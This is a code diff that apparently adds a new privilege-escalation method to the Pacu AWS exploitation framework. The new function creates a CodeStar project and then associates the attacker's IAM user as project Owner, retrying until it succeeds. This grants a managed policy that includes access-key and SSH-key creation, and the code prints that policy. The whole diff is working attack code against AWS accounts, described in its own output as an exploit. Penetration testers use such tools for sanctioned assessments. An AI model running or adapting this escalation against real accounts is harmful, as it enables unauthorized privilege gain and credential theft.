@@ -127,6 +127,7 @@ def main(args, pacu_main):
         'datapipeline:CreatePipeline',
         'datapipeline:PutPipelineDefinition',
         'codestar:CreateProject',
+        'codestar:AssociateTeamMember',
         'codestar:CreateProjectFromTemplate'
     ]
     checked_perms = {'Allow': {}, 'Deny': {}}
@@ -248,12 +249,16 @@ def main(args, pacu_main):
             'lambda:ListFunctions': False,  # Find existing Lambda functions
             'lambda:InvokeFunction': False  # Invoke it afterwards
         },
-        'CodeStarCreateProjectFromTemplate': {
-            'codestar:CreateProjectFromTemplate': True # Create a project from a template
-        },
         'PassExistingRoleToNewCodeStarProject': {
             'codestar:CreateProject': True,  # Create the CodeStar project
             'iam:PassRole': True  # Pass the service role to CodeStar
+        },
+        'CodeStarCreateProjectFromTemplate': {
+            'codestar:CreateProjectFromTemplate': True  # Create a project from a template
+        },
+        'CodeStarCreateProjectThenAssociateTeamMember': {
+            'codestar:CreateProject': True,  # Create the CodeStar project
+            'codestar:AssociateTeamMember': True  # Associate themselves with the project
         }
     }
 
@@ -2011,7 +2016,7 @@ def PassExistingRoleToNewCodeStarProject(pacu_main, print, input, fetch_data):
     client = pacu_main.get_boto3_client('codestar', region)
     active_aws_key = session.get_active_aws_key(pacu_main.database)
 
-    project_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    project_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
 
     codestar_cf_template = {
         "Resources": {
@@ -2080,11 +2085,157 @@ def PassExistingRoleToNewCodeStarProject(pacu_main, print, input, fetch_data):
             }
         )
 
-        print('Successfully created CodeStar project {}. If everything went correctly, your user should have a policy attached to them named "CodeStar_{}" soon, which will grant administrator privileges. If that does not happen soon, you may need to query the CodeStar project ({}) to see where it failed.'.format(project_name, project_name, project_name))
+        print('Successfully created CodeStar project {}. If everything went correctly, your user should have a policy attached to them named "CodeStar_{}" soon, which will grant administrator privileges. If that does not happen soon, you may need to query the project to see where it failed.'.format(project_name, project_name))
         return True
     except Exception as error:
         print('Failed to create the CodeStar project, skipping to the next privilege escalation method: {}\n'.format(error))
         return False
+
+
+def CodeStarCreateProjectThenAssociateTeamMember(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
+
+    print('  Starting method CodeStarCreateProjectThenAssociateTeamMember...\n')
+
+    regions = pacu_main.get_regions('codestar')
+    region = None
+
+    if len(regions) > 1:
+        print('  Found multiple valid regions. Choose one below.\n')
+        for i in range(0, len(regions)):
+            print('  [{}] {}'.format(i, regions[i]))
+        choice = input('What region do you want to create the CodeStar project in? ')
+        region = regions[int(choice)]
+    elif len(regions) == 1:
+        region = regions[0]
+    else:
+        while not region:
+            all_codestar_regions = pacu_main.get_regions('codestar', check_session=False)
+            region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
+            if not region:
+                return False
+            elif region not in all_codestar_regions:
+                print('    Region {} is not a valid CodeStar region. Please choose a valid region. Valid CodeStar regions include:\n'.format(region))
+                print(all_codestar_regions)
+                region = None
+
+    print('    Targeting region {}...'.format(region))
+
+    client = pacu_main.get_boto3_client('codestar', region)
+    active_aws_key = session.get_active_aws_key(pacu_main.database)
+
+    project_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
+
+    try:
+        client.create_project(
+            name=project_name,
+            id=project_name
+        )
+        print('Successfully created CodeStar project {}. The next step could take up to a minute, please wait...'.format(project_name))
+    except Exception as error:
+        print('Failed to create the CodeStar project, skipping to the next privilege escalation method: {}\n'.format(error))
+        return False
+
+    time_taken = 0
+    while True:
+        time.sleep(5)
+        time_taken += 5
+        try:
+            client.associate_team_member(
+                projectId=project_name,
+                userArn=active_aws_key.arn,
+                projectRole='Owner',
+                remoteAccessAllowed=True
+            )
+            break
+        except Exception as error:
+            # It might try to associate the team member before the IAM policy is created, so try again
+            if 'ProjectConfigurationException' not in str(error):
+                print('Failed to associate your IAM user as a project team member, skipping to the next privilege escalation method: {}\n'.format(error))
+                return False
+            elif time_taken > 60:
+                print('It has been over a minute and we still cannot associate your IAM user with the project. Something is wrong, considering this a fail: {}\n'.format(error))
+                return False
+
+    print('Successfully associated the IAM user with the CodeStar project {}. The user should now have a managed policy named "CodeStar_{}_Owner" that will grant some additional privileges.'.format(project_name, project_name))
+    print('    At the time of writing this exploit, the permissions of that policy would look like this:')
+
+    owner_policy = {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Sid": "1",
+                "Effect": "Allow",
+                "Action": [
+                    "codestar:*",
+                    "events:ListRuleNamesByTarget",
+                    "iam:GetPolicy*",
+                    "iam:ListPolicyVersions"
+                ],
+                "Resource": [
+                    "arn:aws:codestar:{}:YOUR-ACCOUNT-ID:project/{}".format(region, project_name),
+                    "arn:aws:events:{}:YOUR-ACCOUNT-ID:rule/*".format(region),
+                    "arn:aws:iam::YOUR-ACCOUNT-ID:policy/CodeStar_{}_Owner".format(project_name)
+                ]
+            },
+            {
+                "Sid": "2",
+                "Effect": "Allow",
+                "Action": [
+                    "codestar:DescribeUserProfile",
+                    "codestar:ListProjects",
+                    "codestar:ListUserProfiles",
+                    "codestar:VerifyServiceRole",
+                    "cloud9:DescribeEnvironment*",
+                    "cloud9:ValidateEnvironmentName",
+                    "cloudwatch:DescribeAlarms",
+                    "cloudwatch:GetMetricStatistics",
+                    "cloudwatch:ListMetrics",
+                    "codedeploy:BatchGet*",
+                    "codedeploy:List*",
+                    "ec2:DescribeSubnets",
+                    "ec2:DescribeVpcs",
+                    "iam:GetAccountSummary",
+                    "iam:GetUser",
+                    "iam:ListAccountAliases",
+                    "iam:ListRoles",
+                    "iam:ListUsers",
+                    "lambda:List*",
+                    "sns:List*"
+                ],
+                "Resource": [
+                    "*"
+                ]
+            },
+            {
+                "Sid": "3",
+                "Effect": "Allow",
+                "Action": [
+                    "codestar:*UserProfile",
+                    "iam:GenerateCredentialReport",
+                    "iam:GenerateServiceLastAccessedDetails",
+                    "iam:CreateAccessKey",
+                    "iam:UpdateAccessKey",
+                    "iam:DeleteAccessKey",
+                    "iam:UpdateSSHPublicKey",
+                    "iam:UploadSSHPublicKey",
+                    "iam:DeleteSSHPublicKey",
+                    "iam:CreateServiceSpecificCredential",
+                    "iam:UpdateServiceSpecificCredential",
+                    "iam:DeleteServiceSpecificCredential",
+                    "iam:ResetServiceSpecificCredential",
+                    "iam:Get*",
+                    "iam:List*"
+                ],
+                "Resource": [
+                    "arn:aws:iam::YOUR-ACCOUNT-ID:user/${aws:username}"
+                ]
+            }
+        ]
+    }
+
+    print(json.dumps(owner_policy, indent=4))
+    return True
 
 
 def EditExistingLambdaFunctionWithRole(pacu_main, print, input, fetch_data):
